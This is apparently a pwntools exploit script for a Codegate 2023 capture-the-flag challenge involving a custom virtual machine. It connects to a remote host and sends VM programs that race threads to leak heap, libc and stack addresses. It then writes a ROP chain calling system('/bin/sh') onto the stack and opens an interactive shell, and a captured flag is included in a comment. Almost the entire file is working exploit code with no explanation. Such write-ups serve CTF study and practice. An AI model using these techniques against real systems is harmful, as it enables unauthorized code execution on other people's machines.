from pwn import *
from vmasm import vmasm

# p = remote('localhost', 9000)
p = remote('13.124.115.242',1300)

# codegate2023{5eb733d31e52b17829fbea79e377e652990ff021f3cd68a693c1dc0aa606c4ce6e85fe09f9c6fde560785f510e6047404ee336b1}

t0 = """
start:
    mov r0, 0
    st r0, [0]

    clone t1
    clone t1
    clone t1
    clone t1
    clone t1
    clone t1
    clone t1
    clone t1
    clone t1

    // exit
    mov r0, 2
    mov r1, 0
    syscall reg

t1:
    jmp t1

"""

t0_asm = vmasm(t0)
# allocate some chunks so we can leak non-zero memory
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'volume : ', str(len(t0_asm)).encode())
p.send(t0_asm)


t1 = """
start:
    // r0 = syscall num
    // r1 = fd
    // r2 = <src>
    // r3 = <len>

    mov r0, 1
    st r0, [0]
    mov r0, 0x580
    st r0, [8]
    mov r0, 0x80
    st r0, [0x10]

    mov r0, 1
    mov r1, 0
    mov r2, 8
    mov r3, 0x10

    clone thread1

lbl1:
    // write and check if we wrote 0x180 bytes or not
    mov r0, 1
    syscall mem
    cmp r0, 0xe10
    jnz lbl1

    // exit
    mov r0, 2
    mov r1, 0
    syscall reg

thread1:
t1_loop:
    mov r0, 0xffffffffffffff80
    mov r1, 0xe10
    st r0, [0x8]
    st r1, [0x10]
    mov r0, 0x580
    mov r1, 0x80
    st r0, [0x8]
    st r1, [0x10]
    jmp t1_loop
"""


t1_asm = vmasm(t1)
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'volume : ', str(len(t1_asm)).encode())
p.send(t1_asm)

zz = p.recvuntil(b'complete')[:-len('complete')][-0xe10:]
hbase = u64(zz[0x18:0x20]) - 0x12d50
log.info("hbase: %#x", hbase)

def mdump(byt):
    i = 0
    while i < len(byt):
        log.info(f"{i=:#x}, {u64(byt[i:i+8]):#x}  {u64(byt[i+8:i+16]):#x}")
        i += 16
    return

lbase = u64(zz[0xdf0:0xdf8]) + 0xeb9e0 + 0x1000
log.info("lbase: %#x", lbase)

# leak environ
env = lbase + 0x221200


t2 = """
start:
    mov r0, 1
    st r0, [0]
    mov r0, 0x5f0
    st r0, [8]
    mov r0, 0x10
    st r0, [0x10]

    mov r0, 1
    mov r1, 0
    mov r2, 8
    mov r3, 0x10

    clone thread1

lbl1:
    // write and check if we wrote 0x180 bytes or not
    mov r0, 1
    syscall mem
    cmp r0, 0x20
    jnz lbl1

    // exit
    mov r0, 2
    mov r1, 0
    syscall reg

thread1:
t1_loop:
    mov r0, 0x%x
    mov r1, 0x20
    st r0, [0x8]
    st r1, [0x10]
    mov r0, 0x5f0
    mov r1, 0x10
    st r0, [0x8]
    st r1, [0x10]
    jmp t1_loop
""" % (env - (hbase + 0x13cd0))

t2_asm = vmasm(t2)
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'volume : ', str(len(t2_asm)).encode())
p.send(t2_asm)

zz = p.recvuntil(b'complete')[:-len('complete')][-0x20:]
env = u64(zz[0:8])
log.info("env: %#x", env)
# mdump(zz)


# 0x238 
#
# 0x649
t3 = """
start:
    mov r0, 1
    st r0, [0]
    mov r0, 0x5f0
    st r0, [8]
    mov r0, 0x10
    st r0, [0x10]

    mov r0, 1
    mov r1, 0
    mov r2, 8
    mov r3, 0x10

    clone thread1

lbl1:
    // write and check if we wrote 0x180 bytes or not
    mov r0, 1
    syscall mem
    cmp r0, 0x800
    jnz lbl1

    // exit
    mov r0, 2
    mov r1, 0
    syscall reg

thread1:
t1_loop:
    mov r0, 0x%x
    mov r1, 0x800
    st r0, [0x8]
    st r1, [0x10]
    mov r0, 0x5f0
    mov r1, 0x10
    st r0, [0x8]
    st r1, [0x10]
    jmp t1_loop
""" % (((env & ~0xf) - 0x800) - (hbase + 0x14bc0))

t3_asm = vmasm(t3)
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'volume : ', str(len(t3_asm)).encode())
p.send(t3_asm)

zz = p.recvuntil(b'complete')[:-len('complete')][-0x800:]
# env = u64(zz[0:8])
# log.info("env: %#x", env)
# mdump(zz)

# search libc start main
needle = lbase + 0x29d90
target_addr = 0
i = 0
while i < len(zz):
    if u64(zz[i:i+8]) == needle:
        target_addr = ((env & ~0xf) - 0x800) + i - 0xb0
        break
    i += 8


assert target_addr != 0



t4 = """
start:
    mov r0, 0
    st r0, [0x10]
    mov r0, 0x5f0
    st r0, [0]
    mov r0, 0x8
    st r0, [0x8]

    clone thread1

lbl1:
    // read
    mov r0, 0
    mov r1, 0x10
    mov r2, 0
    mov r3, 8

    syscall mem

    ld r1, [0x28]
    cmp r1, 0x%x
    jnz lbl1

    // write succeded

    // tell clone thread to stop
    mov r4, 0
    st r4, [8]

    // give hint to user
    mov r0, 1
    mov r1, 1
    mov r2, 0x18
    mov r3, 8
    mov r4, 0x6162636465666768
    st r4, [0x18]
    syscall reg

    mov r4, 0
    st r4, [0x18]

    // synchronize with user
lbl2:
    // while input != 0x4142434445464748, continue
    mov r0, 0
    mov r1, 0
    mov r2, 0x18
    mov r3, 8
    syscall reg
    ld r4, [0x18]
    cmp r4, 0x4142434445464748
    jnz lbl2

    // we have synchronized
    mov r0, 0
    mov r1, 0
    mov r2, 0x28
    mov r3, 8
    syscall reg

    mov r0, 0
    mov r1, 0
    mov r2, 0
    mov r3, 0x30
    syscall reg

    // exit
    mov r0, 2
    mov r1, 0
    syscall reg

thread1:
t1_loop:
    ld r0, [8]
    cmp r0, 0
    jz die_loop

    mov r0, 0xffffffffffffff98
    st r0, [0x0]
    mov r1, 0x5f0
    st r1, [0x0]
    jmp t1_loop

die_loop:
    jmp die_loop
""" % (hbase + 0x15c88 - 0x28)

t4_asm = vmasm(t4)
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'volume : ', str(len(t4_asm)).encode())
p.send(t4_asm)

while True:
    for i in range(0x80):
        p.send(p64(hbase + 0x15c88 - 0x28))
    if p.can_recv(0.5):
        break

p.recv(8)
p.send(p64(0x4142434445464748))
p.send(p64(target_addr))

z = p64(lbase + 0x000000000002a3e5)
z += p64(lbase + 0x1d8698)
z += p64(lbase + 0x000000000002a3e6)
z += p64(lbase + 0x50d60)
z += p64(0)
z += p64(0)

p.send(z)




p.interactive()
